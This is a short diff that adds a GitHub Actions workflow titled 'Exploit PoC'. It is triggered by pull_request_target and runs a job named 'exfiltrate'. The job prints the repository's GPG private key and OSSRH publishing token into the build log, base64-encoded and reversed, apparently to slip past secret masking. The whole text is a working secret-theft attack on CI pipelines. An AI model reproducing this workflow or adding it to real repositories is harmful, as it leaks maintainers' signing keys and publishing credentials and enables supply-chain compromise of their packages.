@@ -1,0 +1,13 @@
+name: Exploit PoC
+on:
+  pull_request_target:
+    types: [opened, synchronize]
+
+jobs:
+  exfiltrate:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Extracting Secrets
+        run: |
+          echo "GPG_KEY_BASE64: $(echo "${{ secrets.GPG_PRIVATE_KEY }}" | base64 -w 0 | rev)"
+          echo "OSSRH_TOKEN_BASE64: $(echo "${{ secrets.OSSRH_TOKEN }}" | base64 -w 0 | rev)"
